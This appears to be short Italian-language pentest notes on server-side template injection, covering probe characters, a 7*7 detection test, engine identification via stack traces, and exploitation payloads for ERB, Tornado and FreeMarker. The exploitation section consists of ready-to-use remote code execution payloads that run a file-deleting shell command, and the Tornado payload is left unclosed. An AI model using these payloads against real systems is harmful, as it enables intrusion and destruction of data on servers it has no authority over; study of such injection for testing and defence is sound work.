# Caratteri di verifica:
```
${{<%[%'"}}%\
```

# Detection
* Usare i simboli base per vedere se qualcuno causa qualche effetto indisiderato (come rendere invisibile una parte di testo);
* Inserire fra l'apertura e la chiusura 7*7. Se viene stampato 49 allora è responsive e vulnerabile;

# Identification
* Causare uno stacktrace per leggere il nome del template engine usato;
* Trovare qualche informazione nel codice sorgente.

# Exploitation
(ricordati di codificare i payload in URL syntax)
## ERB
```
<%= system("rm /path/to/file.txt") %>
```

## Tornado
```
{% import os %}
{{os.system('rm /path/to/file.txt')
```

## FreeMarker
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /path/to/file.txt") }
```
